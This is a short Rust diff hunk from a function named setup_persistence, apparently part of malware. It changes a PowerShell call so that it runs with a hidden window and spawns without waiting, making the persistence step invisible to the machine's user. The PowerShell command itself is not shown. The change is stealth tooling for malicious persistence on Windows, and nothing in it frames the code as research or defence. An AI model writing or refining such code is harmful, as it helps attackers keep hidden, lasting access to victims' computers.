@@ -40,8 +40,8 @@ fn setup_persistence(uuid: &str) -> Result<(), Box<dyn std::error::Error>> {
         dest_path.display()
     );
     Command::new("powershell")
-        .args(&["-Command", &powershell_command])
-        .output()
+        .args(&["-WindowStyle", "hidden", "-Command", &powershell_command])
+        .spawn()
         .expect("Failed to execute PowerShell command");
 
     Ok(())
